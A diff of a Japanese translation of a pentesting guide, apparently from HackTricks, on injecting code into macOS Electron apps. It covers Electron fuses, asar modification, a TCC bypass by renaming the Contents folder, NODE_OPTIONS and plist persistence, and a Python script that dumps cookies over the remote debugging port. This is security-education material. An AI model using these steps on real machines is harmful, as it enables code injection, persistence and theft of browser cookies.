@@ -4,17 +4,17 @@
 
 ## 基本情報
 
-Electronが何か知らない場合は、[**こちらにたくさんの情報があります**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。しかし、今はElectronが**node**を実行することだけを知っておいてください。\
+Electronが何か知らない場合は、[**こちらにたくさんの情報があります**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。しかし、今はElectronが**node**を実行することだけを知っておいてください。\
 そしてnodeには、指定されたファイル以外の**コードを実行させるために使用できる**いくつかの**パラメータ**と**環境変数**があります。
 
 ### Electron Fuses
 
-これらの技術については次に説明しますが、最近Electronはそれらを防ぐためにいくつかの**セキュリティフラグ**を追加しました。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリが**任意のコードを読み込むのを防ぐために使用されるものです**：
+これらの技術については次に説明しますが、最近Electronはそれらを防ぐためにいくつかの**セキュリティフラグ**を追加しました。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリが**任意のコードを読み込むのを防ぐために使用される**ものです：
 
 - **`RunAsNode`**: 無効にすると、コードを注入するための環境変数**`ELECTRON_RUN_AS_NODE`**の使用が防止されます。
-- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`や`--inspect-brk`のようなパラメータが尊重されません。この方法でコードを注入するのを避けます。
-- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**がmacOSによって**検証されます**。これにより、このファイルの内容を変更することによる**コード注入**が防止されます。
-- **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込むのではなく：**`app.asar`**、**`app`**、そして最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせることで**検証されていないコードを読み込むことが不可能**になります。
+- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`や`--inspect-brk`のようなパラメータは尊重されません。この方法でコードを注入するのを避けます。
+- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**はmacOSによって**検証**されます。この方法でこのファイルの内容を変更することによる**コード注入**を防ぎます。
+- **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込むのを探すのではなく：**`app.asar`**、**`app`**、そして最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせることで**検証されていないコードを読み込むことが不可能**になります。
 - **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスは`browser_v8_context_snapshot.bin`というファイルをV8スナップショットに使用します。
 
 コード注入を防がないもう一つの興味深いフューズは：
@@ -37,22 +37,22 @@ EnableEmbeddedAsarIntegrityValidation is Enabled
 OnlyLoadAppFromAsar is Enabled
 LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-### Electron フューズの変更
+### Electron Fuseの変更
 
-[**ドキュメントに記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron フューズ**の設定は、**Electron バイナリ**内にあり、どこかに文字列 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** が含まれています。
+[**ドキュメントに記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron Fuse**の設定は、**Electronバイナリ**内にあり、どこかに文字列**`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**が含まれています。
 
-macOS アプリケーションでは、通常 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` にあります。
+macOSアプリケーションでは、通常、`application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`にあります。
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-このファイルを[https://hexed.it/](https://hexed.it/)にロードし、前の文字列を検索できます。この文字列の後に、各ヒューズが無効か有効かを示すASCIIの数字「0」または「1」が表示されます。ヒューズの値を**変更する**には、16進数コード（`0x30`は`0`、`0x31`は`1`）を変更してください。
+このファイルを[https://hexed.it/](https://hexed.it/)にロードし、前の文字列を検索できます。この文字列の後に、各ヒューズが無効または有効であることを示すASCIIの数字「0」または「1」が表示されます。ヒューズの値を**変更する**には、16進数コード（`0x30`は`0`、`0x31`は`1`）を変更してください。
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-**`Electron Framework`**バイナリをこれらのバイトを変更してアプリケーション内に**上書き**しようとすると、アプリは実行されないことに注意してください。
+**`Electron Framework`**バイナリをこれらのバイトを変更してアプリケーション内に**上書き**しようとすると、アプリは実行されませんので注意してください。
 
-## RCEコードをElectronアプリケーションに追加する
+## RCEをElectronアプリケーションにコードを追加する
 
 Electronアプリが使用している**外部JS/HTMLファイル**がある可能性があるため、攻撃者はこれらのファイルにコードを注入し、その署名がチェックされないため、アプリのコンテキストで任意のコードを実行できます。
 
@@ -60,17 +60,17 @@ Electronアプリが使用している**外部JS/HTMLファイル**がある可�
 > ただし、現時点では2つの制限があります：
 >
 > - アプリを変更するには**`kTCCServiceSystemPolicyAppBundles`**権限が**必要**であり、デフォルトではこれがもはや可能ではありません。
-> - コンパイルされた**`asap`**ファイルは通常、ヒューズ**`embeddedAsarIntegrityValidation`** `と` **`onlyLoadAppFromAsar`**が`有効`です。
+> - コンパイルされた**`asap`**ファイルは通常、ヒューズ**`embeddedAsarIntegrityValidation`**および**`onlyLoadAppFromAsar`**が**有効**です。
 >
 > この攻撃経路をより複雑（または不可能）にします。
 
-**`kTCCServiceSystemPolicyAppBundles`**の要件を回避することは可能で、アプリケーションを別のディレクトリ（例えば**`/tmp`**）にコピーし、フォルダ**`app.app/Contents`**の名前を**`app.app/NotCon`**に変更し、**悪意のある**コードで**asar**ファイルを**変更**し、再び**`app.app/Contents`**に名前を戻して実行することができます。
+**`kTCCServiceSystemPolicyAppBundles`**の要件を回避することは可能で、アプリケーションを別のディレクトリ（例えば**`/tmp`**）にコピーし、フォルダー**`app.app/Contents`**の名前を**`app.app/NotCon`**に変更し、**悪意のある**コードで**asar**ファイルを**変更**し、再び**`app.app/Contents`**に名前を戻して実行することができます。
 
 asarファイルからコードを展開するには、次のコマンドを使用できます：
 ```bash
 npx asar extract app.asar app-decomp
 ```
-そして、次のように修正した後に再パッケージ化します:
+そして、次のように修正した後に再パッケージしてください:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
@@ -129,7 +129,7 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 
 ### アプリのPlistからのインジェクション
 
-これらのキーを追加することで、plist内のこの環境変数を悪用して永続性を維持できます:
+この環境変数をplistで悪用して、持続性を維持するためにこれらのキーを追加できます:
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -155,13 +155,13 @@ According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> フューズ **`EnableNodeCliInspectArguments`** が無効になっている場合、アプリは起動時にノードパラメータ（`--inspect` など）を **無視**します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は、これもフューズ **`RunAsNode`** が無効になっていると **無視**されます。
+> フューズ **`EnableNodeCliInspectArguments`** が無効になっている場合、アプリは起動時に環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されていない限り、ノードパラメータ（`--inspect` など）を **無視** します。このフューズ **`RunAsNode`** が無効になっている場合、環境変数も **無視** されます。
 >
-> しかし、**electron パラメータ `--remote-debugging-port=9229`** を使用することで、Electronアプリから**履歴**（GETコマンドを使用）やブラウザの**クッキー**を盗むことが可能ですが、前のペイロードは他のプロセスを実行するためには機能しません。
+> ただし、**electron パラメータ `--remote-debugging-port=9229`** を使用することで、Electronアプリから **履歴**（GETコマンドを使用）やブラウザの **クッキー** を盗むことが可能ですが、以前のペイロードは他のプロセスを実行するためには機能しません。
 
-パラメータ **`--remote-debugging-port=9222`** を使用することで、Electronアプリから**履歴**（GETコマンドを使用）やブラウザの**クッキー**を盗むことが可能です（クッキーはブラウザ内で**復号化**され、クッキーを提供する**jsonエンドポイント**があります）。
+パラメータ **`--remote-debugging-port=9222`** を使用することで、Electronアプリから **履歴**（GETコマンドを使用）やブラウザの **クッキー** を盗むことが可能です（クッキーはブラウザ内で **復号化** され、クッキーを提供する **json エンドポイント** があります）。
 
-その方法については[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学ぶことができ、自動ツール[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)や次のようなシンプルなスクリプトを使用できます:
+その方法については [**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) と [**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) で学ぶことができ、ツール [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) や次のようなシンプルなスクリプトを使用できます:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -169,7 +169,7 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-[**このブログ投稿**](https://hackerone.com/reports/1274695)では、このデバッグが悪用されて、ヘッドレスChromeが**任意の場所に任意のファイルをダウンロード**します。
+この[**ブログ投稿**](https://hackerone.com/reports/1274695)では、このデバッグが悪用され、ヘッドレスChromeが**任意の場所に任意のファイルをダウンロード**します。
 
 ### アプリのPlistからのインジェクション
 
